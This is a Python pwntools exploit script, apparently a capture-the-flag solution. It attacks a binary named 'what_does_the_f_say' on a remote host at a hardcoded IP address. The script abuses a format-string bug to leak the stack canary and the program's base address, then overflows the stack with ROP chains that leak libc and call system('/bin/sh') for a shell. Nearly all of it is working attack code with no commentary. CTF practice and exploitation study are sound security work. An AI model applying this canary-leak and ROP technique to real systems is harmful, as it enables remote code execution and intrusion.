#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./what_does_the_f_say --host 94.237.58.103 --port 36050
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './what_does_the_f_say_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.58.103'
port = int(args.PORT or 36050)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
#breakrva 0x164c
#breakrva 0x1499
breakrva 0x155b
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def leak_value(offset):
    io.sendlineafter(b'food\n', b'1')
    io.sendlineafter(b'70.00 s.rocks)\n', b'2')
    payload = b'%' + str(offset).encode() + b'$p'
    io.sendlineafter(b'?', payload)
    ret = io.recvlines(2)[1].strip().decode()
    return ret

if args.FUZZ:
    s = int(args.BASE_VAL)
    for i in range(s, s+7):
        ret = leak_value(i)
        print(f'{i}: {ret}')

offset_fmt_canary = 13
offset_fmt_bin = 15

canary = int(leak_value(offset_fmt_canary), base=16)
print(f'canary: {hex(canary)}')

leak_bin = int(leak_value(offset_fmt_bin), base=16)
print(f'leak_bin: {hex(leak_bin)}')
bin_base_addr = (leak_bin - 106) - exe.symbols['fox_bar']
print(f'bin_base_addr: {hex(bin_base_addr)}')
exe.address = bin_base_addr

for _ in range(6):
    leak_value(1)

offset = 24

io.sendlineafter(b'food\n', b'1')
io.sendlineafter(b'70.00 s.rocks)\n', b'2')
io.sendlineafter(b'?\n', b'')

rop = ROP(exe)
rop.puts(exe.got['read'])
rop.warning()

payload = b'a' * offset + p64(canary) + b'a' * 8 + rop.chain()
io.sendlineafter(b'buy it?\n', payload)
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
print(f'libc leak: {hex(leak)}')

libc_exe = ELF('./libc.so.6')
libc_exe.address = leak - libc_exe.symbols['read']
print(f'libc base address: {hex(libc_exe.address)}')

rop = ROP([exe, libc_exe])
rop.raw(rop.ret.address)
rop.system(next(libc_exe.search(b'/bin/sh\x00')))
payload = b'a' * offset + p64(canary) + b'a' * 8 + rop.chain()
io.sendlineafter(b'buy it?\n', payload)

io.interactive()

